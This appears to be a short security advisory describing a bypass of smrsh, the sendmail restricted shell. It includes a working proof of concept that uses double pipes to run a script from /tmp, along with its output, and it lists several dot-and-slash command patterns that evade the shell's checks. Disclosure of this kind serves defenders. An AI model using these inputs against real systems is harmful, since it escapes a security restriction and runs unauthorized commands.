smrsh is designed to prevent the execution of commands outside of the restricted environment. However, when commands are entered using either double pipes (||) or a mixture of dot (.) and slash (/) characters, a user may be able to bypass the checks performed by smrsh. This could lead to the execution of commands outside of the restricted environment.

$ echo "echo unauthorized execute" > /tmp/unauth
$ smrsh -c ". || . /tmp/unauth || ."
/bin/sh: /etc/smrsh/.: is a directory
unauthorized execute

OR one of the following types of commands:

smrsh -c "/ command"
smrsh -c "../ command"
smrsh -c "./ command"
smrsh -c "././ command"
